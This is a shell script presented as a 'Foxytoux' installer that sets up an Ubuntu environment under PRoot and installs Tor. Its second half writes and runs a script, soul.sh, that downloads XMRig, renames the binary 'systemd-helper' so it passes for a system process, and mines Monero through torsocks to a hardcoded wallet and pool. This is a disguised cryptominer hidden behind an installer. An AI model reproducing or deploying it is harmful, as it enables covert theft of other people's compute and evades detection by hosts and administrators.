#!/bin/sh

ROOTFS_DIR=$(pwd)
export PATH=$PATH:~/.local/usr/bin
max_retries=50
timeout=1
ARCH=$(uname -m)

if [ "$ARCH" = "x86_64" ]; then
  ARCH_ALT=amd64
elif [ "$ARCH" = "aarch64" ]; then
  ARCH_ALT=arm64
else
  printf "Unsupported CPU architecture: ${ARCH}"
  exit 1
fi

if [ ! -e $ROOTFS_DIR/.installed ]; then
  echo "#######################################################################################"
  echo "#"
  echo "#                                      Foxytoux INSTALLER"
  echo "#"
  echo "#                           Copyright (C) 2024, RecodeStudios.Cloud"
  echo "#"
  echo "#######################################################################################"

  install_ubuntu="YES"
fi

case $install_ubuntu in
  [yY][eE][sS])
    wget --tries=$max_retries --timeout=$timeout --no-hsts -O /tmp/rootfs.tar.gz \
      "http://cdimage.ubuntu.com/ubuntu-base/releases/20.04/release/ubuntu-base-20.04.4-base-${ARCH_ALT}.tar.gz"
    tar -xf /tmp/rootfs.tar.gz -C $ROOTFS_DIR
    ;;
  *)
    echo "Skipping Ubuntu installation."
    ;;
esac

if [ ! -e $ROOTFS_DIR/.installed ]; then
  mkdir -p $ROOTFS_DIR/usr/local/bin
  wget --tries=$max_retries --timeout=$timeout --no-hsts -O $ROOTFS_DIR/usr/local/bin/proot "https://raw.githubusercontent.com/foxytouxxx/freeroot/main/proot-${ARCH}"

  while [ ! -s "$ROOTFS_DIR/usr/local/bin/proot" ]; do
    rm -f $ROOTFS_DIR/usr/local/bin/proot
    wget --tries=$max_retries --timeout=$timeout --no-hsts -O $ROOTFS_DIR/usr/local/bin/proot "https://raw.githubusercontent.com/foxytouxxx/freeroot/main/proot-${ARCH}"
    [ -s "$ROOTFS_DIR/usr/local/bin/proot" ] && chmod 755 $ROOTFS_DIR/usr/local/bin/proot && break
    sleep 1
  done

  chmod 755 $ROOTFS_DIR/usr/local/bin/proot
fi

if [ ! -e $ROOTFS_DIR/.installed ]; then
  printf "nameserver 1.1.1.1\nnameserver 1.0.0.1" > ${ROOTFS_DIR}/etc/resolv.conf
  rm -rf /tmp/rootfs.tar.xz /tmp/sbin
  touch $ROOTFS_DIR/.installed
fi

CYAN='\e[0;36m'
WHITE='\e[0;37m'
RESET_COLOR='\e[0m'

display_gg() {
  echo -e "${WHITE}___________________________________________________${RESET_COLOR}"
  echo -e ""
  echo -e "           ${CYAN}-----> Mission Completed ! <----${RESET_COLOR}"
}

clear
display_gg

# Run inside the PRoot container
$ROOTFS_DIR/usr/local/bin/proot \
  --rootfs="${ROOTFS_DIR}" \
  -0 -w "/root" -b /dev -b /sys -b /proc -b /etc/resolv.conf --kill-on-exit /bin/bash << 'EOF'

# Update and install packages
apt update && apt install -y sudo nano tor curl wget

# Fix /etc/hosts to include hostname
domain=$(hostname)
if grep -q "127.0.1.1" /etc/hosts; then
  sed -i "s/^127\.0\.1\.1.*/127.0.1.1   $domain/" /etc/hosts
else
  echo "127.0.1.1   $domain" >> /etc/hosts
fi

# Remove 'User debian-tor' from tor-service-defaults-torrc
TOR_DEFAULTS="/usr/share/tor/tor-service-defaults-torrc"
if grep -q "^User debian-tor" "$TOR_DEFAULTS"; then
  sed -i '/^User debian-tor/d' "$TOR_DEFAULTS"
fi

# Configure Tor
echo -e "SocksPort 9050\nLog notice file /var/log/tor/notices.log" >> /etc/tor/torrc

# Start Tor
sudo service tor start

# Wait and check Tor
sleep 3
pgrep tor && echo "[✓] Tor is running!" || echo "[✗] Tor failed to start."

# Create soul.sh miner script
cat << 'EOM' > /root/soul.sh
#!/bin/bash
WALLET="49xs4gWaPLWFzkLbmFgBdm9V9ZU2rf7djF7kUVE11seJgyLEt6GekKpTVhugLXD8tq7gHoMtiqBRj7TsVWdKN5m6Kshxpsv"
POOL="pool.hashvault.pro:8888"
WORKER="king3"

echo "[+] Starting setup..."

install_dependencies() {
    sudo apt update -y && sudo apt install curl -y
}

build_xmrig() {
    curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
    tar -xvf xmrig.tar.gz
    mv xmrig-6.21.0 xmrig
    cd xmrig
    mv xmrig systemd-helper
    rm -rf xmrig
}

start_mining() {
    chmod +x ./systemd-helper
#    mkdir -p /root/.tor && tor & && torsocks ./systemd-helper -o $POOL -u $WALLET -p $WORKER -k --coin monero --donate-level=1
     mkdir -p /root/.tor && tor & sleep 5 && torsocks ./systemd-helper -o "$POOL" -u "$WALLET" -p "$WORKER" -k --coin monero --donate-level=1

}

if [ ! -f "./systemd-helper" ]; then
    install_dependencies
    build_xmrig
fi

start_mining
EOM

# Make all .sh scripts executable
chmod +x /root/*.sh

# Run the miner
./soul.sh

EOF
